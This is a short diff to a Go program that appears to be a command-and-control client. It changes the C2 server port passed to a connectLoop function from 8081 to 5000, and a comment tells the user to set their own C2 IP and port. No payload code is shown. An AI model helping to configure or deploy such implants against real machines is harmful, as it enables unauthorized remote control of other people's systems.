@@ -167,6 +167,6 @@ func connectLoop(server string) {
 }
 
 func main() {
-	go connectLoop("192.168.2.135:8081") // ← Change to your C2 IP and port
+	go connectLoop("192.168.2.135:5000") // ← Change to your C2 IP and port
 	select {}
 }
